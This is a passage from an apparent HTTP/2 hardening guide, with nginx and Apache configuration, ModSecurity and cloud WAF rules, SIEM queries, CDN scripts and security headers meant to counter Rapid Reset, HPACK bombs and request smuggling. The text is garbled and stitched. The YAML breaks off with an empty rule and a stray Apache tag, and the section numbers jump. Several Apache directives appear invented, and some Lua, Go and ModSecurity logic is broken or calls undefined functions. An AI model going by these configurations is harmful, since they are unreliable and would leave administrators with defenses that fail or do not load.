                           'streams=$http2_active_streams '
                           'rst_rate=$http2_reset_rate '
                           'window_avg=$http2_window_average '
                           'action=$http2_action_taken';
    
    server {
        access_log /var/log/nginx/access.log http2_detailed;
        access_log /var/log/nginx/http2_attacks.log http2_attack if=$http2_attack;
        
        # Set attack flag
        set $http2_attack 0;
        
        location / {
            # Detection logic
            if ($http2_reset_count > 100) {
                set $http2_attack 1;
            }
        }
    }
}
```

#### Real-time Monitoring Script
```bash
#!/bin/bash
# monitor_http2_attacks.sh

LOG_FILE="/var/log/nginx/http2_attacks.log"
ALERT_THRESHOLD=10

tail -F "$LOG_FILE" | while read line; do
    # Extract metrics
    streams=$(echo "$line" | grep -o 'streams=[0-9]*' | cut -d= -f2)
    rst_rate=$(echo "$line" | grep -o 'rst_rate=[0-9]*' | cut -d= -f2)
    
    # Alert logic
    if [ "$streams" -gt 1000 ] || [ "$rst_rate" -gt 100 ]; then
        echo "ALERT: HTTP/2 attack detected - $line"
        
        # Take action
        # 1. Block IP
        # 2. Rate limit
        # 3. Notify admin
    fi
done
```

### 7.4 Performance vs Security Trade-offs

#### Optimized Security Configuration
```nginx
# Balanced configuration for security and performance
http {
    # Security-optimized HTTP/2 settings
    http2_max_concurrent_streams 256;  # Balance: 128-512
    http2_max_field_size 8k;           # Balance: 4k-16k
    http2_max_header_size 32k;         # Balance: 16k-64k
    http2_body_preread_size 128k;      # Balance: 64k-256k
    
    # Connection limits
    keepalive_timeout 75s;
    keepalive_requests 1000;
    
    # Buffer tuning for security
    client_body_buffer_size 128k;
    client_header_buffer_size 4k;
    large_client_header_buffers 4 16k;
    
    # Timeouts
    client_body_timeout 12s;
    client_header_timeout 12s;
    send_timeout 10s;
}
```

#### Benchmarking Security Impact
```bash
#!/bin/bash
# benchmark_security.sh

# Test without security
echo "Testing without security limits..."
h2load -n 100000 -c 100 -m 100 https://example.com > baseline.txt

# Test with security
echo "Testing with security limits..."
# Apply security config
sudo nginx -s reload
h2load -n 100000 -c 100 -m 100 https://example.com > secured.txt

# Compare results
echo "=== Performance Comparison ==="
echo "Baseline RPS: $(grep 'finished in' baseline.txt | awk '{print $NF}')"
echo "Secured RPS: $(grep 'finished in' secured.txt | awk '{print $NF}')"
```

---

## 8. Apache httpd HTTP/2 Hardening {#apache-hardening}

### 8.1 mod_http2 Security Configuration

#### Basic Secure Configuration
```apache
# /etc/apache2/mods-available/http2.conf
LoadModule http2_module modules/mod_http2.so

<IfModule http2_module>
    # Connection limits
    H2MaxSessionStreams 100
    H2MaxWorkerStreams 100
    H2MaxFrameSize 16384
    H2WindowSize 65535
    
    # Security settings
    H2Direct on
    H2SerializeHeaders off
    H2StreamTimeout 30
    
    # Protect against attacks
    H2MaxHeaderFieldSize 4096
    H2MaxHeaderFields 100
    H2MaxRequests 1000
    
    # TLS requirements
    H2ModernTLSOnly on
</IfModule>

# Virtual host configuration
<VirtualHost *:443>
    ServerName example.com
    
    # Enable HTTP/2
    Protocols h2 http/1.1
    
    # SSL configuration
    SSLEngine on
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
    SSLHonorCipherOrder on
    
    # Security headers
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Frame-Options DENY
    Header always set X-Content-Type-Options nosniff
    Header always set X-XSS-Protection "1; mode=block"
    
    # Rate limiting
    <Location "/">
        # Use mod_ratelimit or mod_qos
        SetEnv rate-limit 100
    </Location>
</VirtualHost>
```

#### Advanced Security Configuration
```apache
# Advanced HTTP/2 security
<IfModule mod_http2.c>
    # Connection management
    H2MaxSessionStreams 128
    H2MinWorkers 10
    H2MaxWorkers 100
    H2MaxDataFrameLen 16384
    
    # Attack protection
    H2MaxResetFrames 100
    H2MaxPadding 256
    H2MaxConcurrentPushes 10
    
    # Memory limits
    H2StreamMemLimit 65536
    H2SessionMemLimit 1048576
    
    # Logging
    H2TraceLevel debug
    H2CopyFiles off
</IfModule>

# Virtual host with security modules
<VirtualHost *:443>
    # Load security modules
    LoadModule security2_module modules/mod_security2.so
    LoadModule evasive_module modules/mod_evasive20.so
    
    # ModSecurity
    SecRuleEngine On
    SecRequestBodyLimit 134217728
    SecRequestBodyNoFilesLimit 131072
    
    # HTTP/2 specific rules
    SecRule &REQUEST_HEADERS:":method" "@eq 0" \
        "id:1000,phase:1,deny,msg:'HTTP/2 pseudo-header missing'"
    
    SecRule REQUEST_HEADERS:":path" "@validateByteRange 32-126" \
        "id:1001,phase:1,deny,msg:'Invalid characters in :path'"
    
    # mod_evasive for DDoS protection
    DOSHashTableSize 3097
    DOSPageCount 2
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 10
    
    # Custom logging
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \
               \"%{H2_STREAM_ID}e\" \"%{H2_STREAM_ERROR}e\"" http2_combined
    CustomLog /var/log/apache2/http2_access.log http2_combined
</VirtualHost>
```

### 8.2 Mitigation for Specific Attacks

#### Rapid Reset Protection
```apache
# Rapid Reset mitigation
<IfModule mod_http2.c>
    # Limit RST_STREAM frames
    H2MaxResetFrames 50
    H2ResetStreamTimeout 5
    
    # Early detection
    <IfModule mod_lua.c>
        LuaHookLog http2_log_hook
    </IfModule>
</IfModule>

# Lua script for detection
<IfModule mod_lua.c>
    LuaHookLog /etc/apache2/http2_monitor.lua
</IfModule>
```

**http2_monitor.lua**:
```lua
function http2_log_hook(log)
    local rst_count = 0
    local stream_id = log.headers_in[":stream-id"] or "0"
    
    -- Count RST_STREAM frames per connection
    local key = log.remote_addr .. ":" .. stream_id
    local count = rst_counter:get(key) or 0
    count = count + 1
    
    if count > 100 then
        -- Block this connection
        log.notes["block-connection"] = "true"
        apache.log_error("Rapid Reset detected from " .. log.remote_addr)
    end
    
    rst_counter:set(key, count, 60)  -- 60 second window
end

-- Initialize counter
rst_counter = {}
```

#### HPACK Bomb Protection
```apache
# HPACK protection
<IfModule mod_http2.c>
    # Limit header sizes
    H2MaxHeaderFieldSize 4096
    H2MaxHeaderFields 100
    
    # Limit table size
    H2MaxTableSize 4096
    H2TablePruneInterval 30
</IfModule>

# Additional validation
<Location "/">
    # Check header count
    RewriteCond %{HTTP:H2-Header-Count} >100
    RewriteRule .* - [F]
    
    # Check total header size
    SetEnvIf H2-Header-Size >16384 header_too_large
    Deny from env=header_too_large
</Location>
```

### 8.3 Monitoring and Metrics

#### HTTP/2 Status Module
```apache
# Enable status module for monitoring
<Location /server-status>
    SetHandler server-status
    Require ip 127.0.0.1 10.0.0.0/8
    
    # Extended status with HTTP/2 metrics
    ExtendedStatus On
</Location>

# Custom metrics collection
<IfModule mod_status.c>
    # Add HTTP/2 metrics to status page
    <Location /http2-status>
        SetHandler http2-status
        Require ip 127.0.0.1
    </Location>
</IfModule>
```

#### Log Analysis Script
```bash
#!/bin/bash
# analyze_http2_logs.sh

LOG_FILE="/var/log/apache2/http2_access.log"
ALERT_FILE="/var/log/apache2/http2_alerts.log"

# Analyze for attacks
analyze_logs() {
    echo "=== HTTP/2 Security Analysis ==="
    echo "Time: $(date)"
    echo ""
    
    # Rapid Reset detection
    echo "1. Rapid Reset Detection:"
    grep "RST_STREAM" "$LOG_FILE" | \
        awk '{print $1}' | \
        sort | uniq -c | \
        sort -rn | head -10 | \
        while read count ip; do
            if [ "$count" -gt 100 ]; then
                echo "ALERT: $ip sent $count RST_STREAM frames"
                echo "$(date) ALERT: $ip - $count RST_STREAM frames" >> "$ALERT_FILE"
            fi
        done
    
    # HPACK bomb detection
    echo ""
    echo "2. Large Header Detection:"
    awk '{print $1, $(NF-1)}' "$LOG_FILE" | \
        awk '$2 > 10000 {print $1, $2}' | \
        sort | uniq -c | \
        while read count ip size; do
            echo "ALERT: $ip sent headers of size $size ($count times)"
        done
    
    # Connection exhaustion
    echo ""
    echo "3. Connection Exhaustion:"
    netstat -an | grep :443 | \
        awk '{print $5}' | \
        cut -d: -f1 | \
        sort | uniq -c | \
        sort -rn | head -10 | \
        while read count ip; do
            if [ "$count" -gt 50 ]; then
                echo "ALERT: $ip has $count connections"
            fi
        done
}

# Run analysis
analyze_logs
```

---

## 9. WAF Rules for HTTP/2 {#waf-rules}

### 9.1 ModSecurity Rules for HTTP/2

#### Core Rule Set for HTTP/2
```apache
# http2_core_rules.conf
SecRule REQUEST_METHOD "@rx ^(?:GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)$" \
    "id:10000,phase:1,pass,nolog,ctl:ruleEngine=On"

# Validate HTTP/2 pseudo-headers
SecRule &REQUEST_HEADERS:":method" "!@eq 1" \
    "id:10001,phase:1,deny,status:400,msg:'Missing :method pseudo-header'"

SecRule &REQUEST_HEADERS:":path" "!@eq 1" \
    "id:10002,phase:1,deny,status:400,msg:'Missing :path pseudo-header'"

SecRule &REQUEST_HEADERS:":scheme" "!@eq 1" \
    "id:10003,phase:1,deny,status:400,msg:'Missing :scheme pseudo-header'"

# Validate pseudo-header values
SecRule REQUEST_HEADERS:":method" "!@rx ^(?:GET|HEAD|POST|PUT|DELETE|CONNECT|OPTIONS|TRACE|PATCH)$" \
    "id:10004,phase:1,deny,status:400,msg:'Invalid HTTP method in :method'"

SecRule REQUEST_HEADERS:":path" "@rx [\x00-\x1F\x7F]" \
    "id:10005,phase:1,deny,status:400,msg:'Invalid characters in :path'"

# Prevent request smuggling
SecRule REQUEST_HEADERS:":method" "@streq POST" \
    "id:10006,phase:1,chain,deny,status:400,msg:'HTTP/2 request smuggling attempt'"
    SecRule REQUEST_HEADERS:Content-Length "!@eq 0" \
        "chain"
    SecRule REQUEST_HEADERS:Transfer-Encoding "!@eq 0"

# Limit header count
SecRule &REQUEST_HEADERS "@gt 100" \
    "id:10007,phase:1,deny,status:400,msg:'Too many headers'"

# Limit header size
SecRule REQUEST_HEADERS_NAMES "@rx ^:" \
    "id:10008,phase:1,chain,deny,status:400,msg:'Pseudo-header in wrong position'"
    SecRule MATCHED_VAR "@rx ^[^:]" \
        "chain"
    SecRule MATCHED_VAR "!@rx ^:"

# Detect Rapid Reset attacks
SecRule &TX:http2_rst_count "@gt 100" \
    "id:10009,phase:5,deny,status:429,msg:'Rapid Reset attack detected'"

# HPACK bomb detection
SecRule REQUEST_HEADERS:":authority" "@gt 1000" \
    "id:10010,phase:1,deny,status:400,msg:'Excessive authority header size'"
```

#### Advanced Attack Detection
```apache
# http2_advanced_rules.conf

# Stream exhaustion detection
SecRule &TX:http2_active_streams "@gt 1000" \
    "id:10100,phase:5,deny,status:429,msg:'Stream exhaustion attack'"

# Priority inversion detection
SecRule REQUEST_HEADERS:":priority" "@rx \b\d+\b" \
    "id:10101,phase:1,chain,t:none,log,msg:'Priority manipulation attempt'"
    SecRule REQUEST_HEADERS:":priority" "@rx \b0*\b"

# Window update flooding
SecRule &TX:http2_window_updates "@gt 1000" \
    "id:10102,phase:5,deny,status:429,msg:'Window update flooding'"

# CONTINUATION frame attack
SecRule &TX:http2_continuation_frames "@gt 100" \
    "id:10103,phase:5,deny,status:400,msg:'CONTINUATION frame attack'"

# Padding attack detection
SecRule REQUEST_HEADERS:":padding" "@gt 256" \
    "id:10104,phase:1,deny,status:400,msg:'Excessive padding'"

# Detect malformed frames
SecRule REQUEST_HEADERS:":frame-type" "!@rx ^(?:0[0-9]|10)$" \
    "id:10105,phase:1,deny,status:400,msg:'Invalid frame type'"
```

### 9.2 Cloudflare WAF Rules

#### Custom Firewall Rules
```javascript
// Cloudflare Workers for HTTP/2 protection
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    // Check for HTTP/2 Rapid Reset
    const cf = request.cf
    const headers = request.headers
    
    // Detect excessive RST_STREAM
    if (headers.get('cf-http2-rst-count') > 100) {
        return new Response('Blocked: Rapid Reset Attack', {
            status: 429,
            headers: { 'Content-Type': 'text/plain' }
        })
    }
    
    // Check for HPACK bombs
    const headerCount = Array.from(headers.keys()).length
    if (headerCount > 100) {
        return new Response('Blocked: Excessive Headers', {
            status: 400,
            headers: { 'Content-Type': 'text/plain' }
        })
    }
    
    // Check request smuggling
    const contentLength = headers.get('content-length')
    const transferEncoding = headers.get('transfer-encoding')
    
    if (contentLength && transferEncoding) {
        return new Response('Blocked: Request Smuggling Attempt', {
            status: 400,
            headers: { 'Content-Type': 'text/plain' }
        })
    }
    
    // Forward request
    return fetch(request)
}
```

#### WAF Configuration Rules
```json
{
  "rules": [
    {
      "id": "http2_rapid_reset",
      "description": "Block HTTP/2 Rapid Reset attacks",
      "expression": "(http.request.uri.path matches \".*\") and (cf.edge.server_ip in {})",
      "action": "block",
      "enabled": true
    },
    {
      "id": "http2_hpack_bomb",
      "description": "Detect HPACK bombs",
      "expression": "http.request.headers.count > 100",
      "action": "challenge",
      "enabled": true
    },
    {
      "id": "http2_smuggling",
      "description": "Prevent HTTP/2 request smuggling",
      "expression": "http.request.headers[\"content-length\"] and http.request.headers[\"transfer-encoding\"]",
      "action": "block",
      "enabled": true
    }
  ]
}
```

### 9.3 AWS WAF Rules

#### Web ACL Rules for HTTP/2
```yaml
# AWS WAFv2 Web ACL
WebACL:
  Name: http2-protection
  DefaultAction:
    Allow: {}
  Scope: REGIONAL
  VisibilityConfig:
    SampledRequestsEnabled: true
    CloudWatchMetricsEnabled: true
    MetricName: http2-protection
  
  Rules:
    - Name: http2-rapid-reset
      Priority: 1
      Statement:
        RateBasedStatement:
          Limit: 10000
          AggregateKeyType: IP
      Action:
        Block: {}
      VisibilityConfig:
        SampledRequestsEnabled: true
        CloudWatchMetricsEnabled: true
        MetricName: http2-rapid-reset
    
    - Name: http2-hpack-bomb
      Priority: 2
      Statement:
        SizeConstraintStatement:
          FieldToMatch:
            Headers:
              MatchPattern:
                All: {}
              MatchScope: ALL
          ComparisonOperator: GT
          Size: 16384
      Action:
        Block: {}
      VisibilityConfig:
        SampledRequestsEnabled: true
        CloudWatchMetricsEnabled: true
        MetricName: http2-hpack-bomb
    
    - Name:
    - Name: http2-smuggling
      Priority: 3
      Statement:
        ByteMatchStatement:
          FieldToMatch:
            Headers:
              MatchPattern:
                All: {}
              MatchScope: ALL
          SearchString: "content-length"
          PositionalConstraint: CONTAINS
      Action:
        Block: {}
      VisibilityConfig:
        SampledRequestsEnabled: true
        CloudWatchMetricsEnabled: true
        MetricName: http2-smuggling
</IfModule>
### 11.2 Detection Rules and Alerts

#### SIEM Detection Rules
```yaml
# Splunk detection rules
http2_rapid_reset_detection:
  search: |
    index=web http2=* 
    | stats count by client_ip 
    | where count > 10000
  alert: "HTTP/2 Rapid Reset Attack Detected"
  severity: "critical"
  action: "block_ip"

http2_hpack_bomb_detection:
  search: |
    index=web http2=* header_count=*
    | where header_count > 100
  alert: "HPACK Bomb Attack Detected"
  severity: "high"
  action: "rate_limit"

http2_smuggling_detection:
  search: |
    index=web http2=* content_length=* transfer_encoding=*
    | where content_length != "" AND transfer_encoding != ""
  alert: "HTTP/2 Request Smuggling Attempt"
  severity: "high"
  action: "block_request"
```

#### ELK Stack Detection
```json
{
  "detection_rules": [
    {
      "name": "HTTP/2 Rapid Reset",
      "index": "web-*",
      "query": {
        "bool": {
          "must": [
            { "term": { "protocol": "HTTP/2.0" } },
            { "range": { "rst_stream_count": { "gt": 100 } } }
          ]
        }
      },
      "alert": {
        "severity": "critical",
        "message": "Rapid Reset attack from {{client_ip}}"
      }
    },
    {
      "name": "HPACK Bomb",
      "index": "web-*",
      "query": {
        "bool": {
          "must": [
            { "term": { "protocol": "HTTP/2.0" } },
            { "range": { "header_count": { "gt": 100 } } },
            { "range": { "header_size": { "gt": 16384 } } }
          ]
        }
      },
      "alert": {
        "severity": "high",
        "message": "HPACK bomb attack from {{client_ip}}"
      }
    }
  ]
}
```

### 11.3 Real-time Detection Systems

#### Go-based Detection Engine
```go
package main

import (
    "fmt"
    "time"
    "sync"
)

type HTTP2Detector struct {
    rstCounters map[string]int
    mu          sync.RWMutex
    alerts      chan Alert
}

type Alert struct {
    Type      string
    ClientIP  string
    Timestamp time.Time
    Details   map[string]interface{}
}

func NewHTTP2Detector() *HTTP2Detector {
    return &HTTP2Detector{
        rstCounters: make(map[string]int),
        alerts:      make(chan Alert, 1000),
    }
}

func (d *HTTP2Detector) ProcessFrame(clientIP string, frameType string) {
    d.mu.Lock()
    defer d.mu.Unlock()
    
    // Track RST_STREAM frames
    if frameType == "RST_STREAM" {
        count := d.rstCounters[clientIP]
        count++
        d.rstCounters[clientIP] = count
        
        // Check threshold
        if count > 100 {
            d.alerts <- Alert{
                Type:      "rapid_reset",
                ClientIP:  clientIP,
                Timestamp: time.Now(),
                Details: map[string]interface{}{
                    "rst_count": count,
                },
            }
        }
    }
}

func (d *HTTP2Detector) Monitor() {
    ticker := time.NewTicker(1 * time.Minute)
    defer ticker.Stop()
    
    for range ticker.C {
        d.mu.Lock()
        // Reset counters
        for ip := range d.rstCounters {
            d.rstCounters[ip] = 0
        }
        d.mu.Unlock()
    }
}

func (d *HTTP2Detector) AlertHandler() {
    for alert := range d.alerts {
        fmt.Printf("[ALERT] %s from %s at %v\n", 
            alert.Type, alert.ClientIP, alert.Timestamp)
        
        // Take action: block, rate limit, notify, etc.
        switch alert.Type {
        case "rapid_reset":
            d.blockIP(alert.ClientIP)
        case "hpack_bomb":
            d.rateLimitIP(alert.ClientIP)
        }
    }
}

func main() {
    detector := NewHTTP2Detector()
    go detector.Monitor()
    go detector.AlertHandler()
    
    // Simulate processing
    for i := 0; i < 1000; i++ {
        detector.ProcessFrame("192.168.1.1", "RST_STREAM")
    }
    
    time.Sleep(2 * time.Minute)
}
```

---

## 12. CDN-Level Mitigations {#cdn-mitigations}

### 12.1 Cloudflare HTTP/2 Protections

#### Managed Rulesets
```json
{
  "rules": [
    {
      "id": "100301",
      "description": "HTTP/2 Rapid Reset Attack Mitigation",
      "action": "block",
      "expression": "(cf.edge.server_ip in {}) and (cf.threat_score gt 14)"
    },
    {
      "id": "100302",
      "description": "HTTP/2 Request Smuggling",
      "action": "block",
      "expression": "http.request.headers[\"content-length\"] and http.request.headers[\"transfer-encoding\"]"
    },
    {
      "id": "100303",
      "description": "HPACK Bomb Protection",
      "action": "challenge",
      "expression": "http.request.headers.count gt 100"
    }
  ]
}
```

#### Workers for Advanced Protection
```javascript
// Cloudflare Worker for HTTP/2 protection
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    const headers = request.headers
    const client = request.cf
    
    // Rapid Reset detection
    const rstCount = headers.get('cf-http2-rst-count') || 0
    if (rstCount > 100) {
        // Send to challenge or block
        return challengeResponse(request)
    }
    
    // HPACK bomb detection
    const headerCount = Array.from(headers.keys()).length
    if (headerCount > 100) {
        return new Response('Too many headers', { status: 400 })
    }
    
    // Request smuggling detection
    if (headers.has('content-length') && headers.has('transfer-encoding')) {
        return new Response('Request smuggling attempt blocked', { status: 400 })
    }
    
    // Forward request
    return fetch(request)
}

async function challengeResponse(request) {
    // Implement challenge (CAPTCHA, etc.)
    return new Response(`
        <html>
        <body>
            <h1>Security Challenge</h1>
            <form action="/verify" method="POST">
                <!-- Challenge implementation -->
            </form>
        </body>
        </html>
    `, {
        headers: { 'Content-Type': 'text/html' }
    })
}
```

### 12.2 AWS CloudFront Protections

#### Lambda@Edge Functions
```javascript
// Lambda@Edge for HTTP/2 protection
exports.handler = async (event) => {
    const request = event.Records[0].cf.request
    const headers = request.headers
    
    // Check for Rapid Reset patterns
    const rstCount = getRstStreamCount(headers)
    if (rstCount > 100) {
        return {
            status: '429',
            statusDescription: 'Too Many Requests',
            body: 'Rapid Reset attack blocked'
        }
    }
    
    // HPACK bomb detection
    const headerSize = calculateHeaderSize(headers)
    if (headerSize > 16384) {
        return {
            status: '400',
            statusDescription: 'Bad Request',
            body: 'Excessive headers blocked'
        }
    }
    
    return request
}

function getRstStreamCount(headers) {
    // Extract RST_STREAM count from custom header
    const rstHeader = headers['x-http2-rst-count']
    return rstHeader ? parseInt(rstHeader[0].value) : 0
}

function calculateHeaderSize(headers) {
    let size = 0
    for (const [key, values] of Object.entries(headers)) {
        size += key.length
        for (const value of values) {
            size += value.value.length
        }
    }
    return size
}
```

#### WAF Integration
```yaml
CloudFrontDistribution:
  Properties:
    DefaultCacheBehavior:
      # Enable WAF
      ViewerProtocolPolicy: redirect-to-https
    # WAF Web ACL association
    WebACLId: !Ref HTTP2ProtectionWebACL

HTTP2ProtectionWebACL:
  Type: AWS::WAFv2::WebACL
  Properties:
    Name: http2-cloudfront-protection
    Scope: CLOUDFRONT
    DefaultAction:
      Allow: {}
    Rules:
      - Name: BlockRapidReset
        Priority: 1
        Statement:
          RateBasedStatement:
            Limit: 10000
            AggregateKeyType: IP
        Action:
          Block: {}
```

### 12.3 Fastly VCL Configurations

#### VCL for HTTP/2 Protection
```vcl
# Fastly VCL for HTTP/2 security
sub vcl_recv {
    # Rapid Reset detection
    if (req.http.Fastly-FF) {
        # Check for excessive RST_STREAM
        if (req.http.X-HTTP2-RST-Count && std.atoi(req.http.X-HTTP2-RST-Count) > 100) {
            error 429 "Rapid Reset Attack";
        }
    }
    
    # HPACK bomb detection
    if (req.http.X-HTTP2-Header-Count && std.atoi(req.http.X-HTTP2-Header-Count) > 100) {
        error 400 "Excessive Headers";
    }
    
    # Request smuggling prevention
    if (req.http.Content-Length && req.http.Transfer-Encoding) {
        error 400 "Request Smuggling Attempt";
    }
}

sub vcl_deliver {
    # Add security headers
    set resp.http.Strict-Transport-Security = "max-age=31536000; includeSubDomains";
    set resp.http.X-Content-Type-Options = "nosniff";
    set resp.http.X-Frame-Options = "DENY";
    set resp.http.X-XSS-Protection = "1; mode=block";
}
```

---

## 13. Security Headers with HTTP/2 {#security-headers}

### 13.1 Essential Security Headers

#### HTTP/2 Specific Headers
```nginx
# nginx configuration
server {
    # HTTP/2 security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';" always;
    
    # HTTP/2 specific optimizations
    add_header Cache-Control "public, max-age=3600" always;
    add_header Vary "Accept-Encoding" always;
}
```

#### Apache Configuration
```apache
<VirtualHost *:443>
    # Security headers for HTTP/2
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Content-Security-Policy "default-src 'self'"
    
    # HTTP/2 optimization headers
    Header always set Cache-Control "public, max-age=3600"
    Header always set Vary "Accept-Encoding"
</VirtualHost>
```

### 13.2 Advanced Header Configurations

#### CSP with HTTP/2 Considerations
```nginx
# Content Security Policy for HTTP/2
map $http2 $csp_header {
    default "default-src 'self'; script-src 'self'; style-src 'self';";
    "h2"    "default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:;";
}

server {
    add_header Content-Security-Policy $csp_header;
    
    # Frame ancestors for HTTP/2
    add_header X-Frame-Options "SAMEORIGIN";
    add_header Frame-Ancestors "'self'";
}
```

#### Security Headers with HPACK Optimization
```nginx
# Optimized headers for HPACK compression
server {
    # Use same header names and values for better compression
    add_header X-Content-Type-Options "nosniff";
    add_header X-Frame-Options "DENY";
    add_header X-XSS-Protection "1; mode=block";
    
    # Reuse values for HPACK efficiency
    map $scheme $hsts_value {
        https   "max-age=31536000; includeSubDomains; preload";
    }
    
    add_header Strict-Transport-Security $hsts_value;
}
```

### 13.3 Monitoring Header Effectiveness

#### Security Header Checker
```python
#!/usr/bin/env python3
# security_header_checker.py

import requests
import json
from typing import Dict, List

class HTTP2SecurityHeaderChecker:
    def __init__(self, url: str):
        self.url = url
        self.results = {}
    
    def check_headers(self) -> Dict:
        """Check security headers for HTTP/2"""
        
        try:
            # Make request with HTTP/2
            response = requests.get(self.url, timeout=10)
            
            # Check for HTTP/2
            self.results['http2'] = response.raw.version == 20
            
            # Required security headers
            required_headers = {
                'Strict-Transport-Security': self.check_hsts,
                'X-Frame-Options': self.check_xfo,
                'X-Content-Type-Options': self.check_xcto,
                'X-XSS-Protection': self.check_xxp,
                'Content-Security-Policy': self.check_csp,
                'Referrer-Policy': self.check_referrer,
            }
            
            for header, check_func in required_headers.items():
                value = response.headers.get(header)
                self.results[header] = {
                    'present': value is not None,
                    'value': value,
                    'valid': check_func(value) if value else False
                }
            
            # HTTP/2 specific checks
            self.results['http2_specific'] = {
                'header_compression': self.check_header_compression(response),
                'stream_management': self.check_stream_management(response),
            }
            
            return self.results
            
        except Exception as e:
            return {'error': str(e)}
    
    def check_hsts(self, value: str) -> bool:
        """Check HSTS header validity"""
        return 'max-age=' in value and 'includeSubDomains' in value
    
    def check_header_compression(self, response) -> Dict:
        """Check HPACK compression effectiveness"""
        # Analyze header sizes and patterns
        total_size = sum(len(k) + len(v) for k, v in response.headers.items())
        
        return {
            'total_header_size': total_size,
            'header_count': len(response.headers),
            'compression_ratio': self.estimate_compression_ratio(response.headers)
        }
    
    def estimate_compression_ratio(self, headers: Dict) -> float:
        """Estimate HPACK compression ratio"""
        # Simplified estimation
        unique_values = len(set(headers.values()))
        total_values = len(headers)
        
        if total_values > 0:
            return unique_values / total_values
        return 1.0

# Usage
if __name__ == "__main__":
    checker = HTTP2SecurityHeaderChecker("https://example.com")
    results = checker.check_headers()
    
    print(json.dumps(results, indent=2))
```

## Conclusion

This comprehensive guide covers HTTP/2 attack techniques, exploitation tools, and defensive strategies. Key takeaways:

### Offensive Summary:
1. **Rapid Reset (CVE-2023-44487)**: Most impactful HTTP/2 attack, enabling massive DDoS
2. **Request Smuggling**: Bypass security controls via protocol confusion
3. **HPACK Bombs**: Memory exhaustion through header compression abuse
4. **Stream Exhaustion**: Resource depletion via concurrent stream limits

### Defensive Summary:
1. **Configuration Hardening**: Proper nginx/Apache settings are critical
2. **WAF Rules**: Custom rules for HTTP/2-specific attacks
3. **Rate Limiting**: Multi-layer limiting at connection, stream, and frame levels
4. **Monitoring**: Comprehensive metrics and real-time detection
5. **CDN Protections**: Leverage cloud provider mitigations

### Best Practices:
1. Keep HTTP/2 implementations updated with security patches
2. Implement defense-in-depth with multiple security layers
3. Monitor for anomalous HTTP/2 patterns
4. Test defenses regularly with controlled attacks
5. Educate teams on HTTP/2-specific security considerations

The evolving nature of HTTP/2 attacks requires continuous monitoring, regular updates, and adaptive security measures to protect against both known and emerging threats.